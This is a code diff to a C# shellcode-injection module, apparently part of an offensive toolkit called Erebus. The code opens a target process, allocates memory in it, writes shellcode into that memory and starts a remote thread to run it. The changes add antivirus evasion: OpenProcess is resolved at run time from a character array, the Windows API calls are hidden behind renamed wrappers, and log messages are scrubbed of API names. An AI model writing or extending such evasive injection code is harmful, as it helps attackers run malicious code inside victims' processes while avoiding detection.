@@ -1,6 +1,7 @@
 using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
 using System.Text;
+using Erebus.ClickOnce.Evasion;
 
 namespace Erebus.ClickOnce.Injections
 {
@@ -10,8 +11,15 @@ namespace Erebus.ClickOnce.Injections
         public string Name => "Classic Remote Thread";
         public string Description => "Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread";
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+        [UnmanagedFunctionPointer(CallingConvention.Winapi, SetLastError = true)]
+        private delegate IntPtr FnOp(uint processAccess, bool bInheritHandle, int processId);
+
+        private static readonly Lazy<FnOp> _openProcess =
+            DynamicApi.LazyDelegate<FnOp>(DynamicApi.Kernel32,
+                new[] { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's' });
+
+        private static IntPtr DoOpenProc(uint processAccess, bool bInheritHandle, int processId)
+            => _openProcess.Value(processAccess, bInheritHandle, processId);
 
         private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
 
@@ -60,7 +68,7 @@ namespace Erebus.ClickOnce.Injections
                 else
                 {
                     DebugLogger.WriteLine($"[+] Opening target process PID: {targetPid}");
-                    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
+                    hProcess = DoOpenProc(PROCESS_ALL_ACCESS, false, targetPid);
 
                     if (hProcess == IntPtr.Zero)
                     {
@@ -71,7 +79,7 @@ namespace Erebus.ClickOnce.Injections
                 }
 
                 // Allocate memory in target process
-                IntPtr baseAddress = Win32.VirtualAllocEx(
+                IntPtr baseAddress = Win32.DoAllocEx(
                     (Win32.HANDLE)hProcess,
                     IntPtr.Zero,
                     (uint)shellcode.Length,
@@ -80,7 +88,7 @@ namespace Erebus.ClickOnce.Injections
 
                 if (baseAddress == IntPtr.Zero)
                 {
-                    DebugLogger.WriteLine($"[-] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
+                    DebugLogger.WriteLine($"[-] alloc step failed: {Marshal.GetLastWin32Error()}");
                     Win32.CloseHandle(hProcess);
                     return false;
                 }
@@ -93,7 +101,7 @@ namespace Erebus.ClickOnce.Injections
                     fixed (byte* pShellcode = shellcode)
                     {
                         nuint written = 0;
-                        Win32.BOOL writeResult = Win32.WriteProcessMemory(
+                        Win32.BOOL writeResult = Win32.DoWriteMem(
                             (Win32.HANDLE)hProcess,
                             (void*)baseAddress,
                             pShellcode,
@@ -102,7 +110,7 @@ namespace Erebus.ClickOnce.Injections
 
                         if (!writeResult)
                         {
-                            DebugLogger.WriteLine($"[-] WriteProcessMemory failed: {Marshal.GetLastWin32Error()}");
+                            DebugLogger.WriteLine($"[-] write step failed: {Marshal.GetLastWin32Error()}");
                             Win32.CloseHandle(hProcess);
                             return false;
                         }
@@ -115,7 +123,7 @@ namespace Erebus.ClickOnce.Injections
                 DebugLogger.WriteLine("[+] Creating remote thread...");
                 unsafe
                 {
-                    Win32.HANDLE hThread = Win32.CreateRemoteThread(
+                    Win32.HANDLE hThread = Win32.DoRemoteStart(
                         (Win32.HANDLE)hProcess,
                         null,
                         0,
@@ -126,7 +134,7 @@ namespace Erebus.ClickOnce.Injections
 
                     if (hThread.IsNull)
                     {
-                        DebugLogger.WriteLine($"[-] CreateRemoteThread failed: {Marshal.GetLastWin32Error()}");
+                        DebugLogger.WriteLine($"[-] remote-start step failed: {Marshal.GetLastWin32Error()}");
                         Win32.CloseHandle(hProcess);
                         return false;
                     }
